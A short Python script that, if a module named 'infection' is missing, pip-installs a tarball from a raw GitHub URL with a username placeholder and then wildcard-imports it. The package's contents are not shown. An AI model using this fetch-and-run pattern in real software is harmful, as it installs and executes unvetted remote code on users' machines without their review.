#!/bin/python3

import pip

try:
    __import__("infection")
except ImportError:
    pip.main(['install', "https://raw.githubusercontent.com/Michalkap28/infection/main/dist/infection_YOUR_USERNAME_HERE-0.0.1.tar.gz"])

from infection import *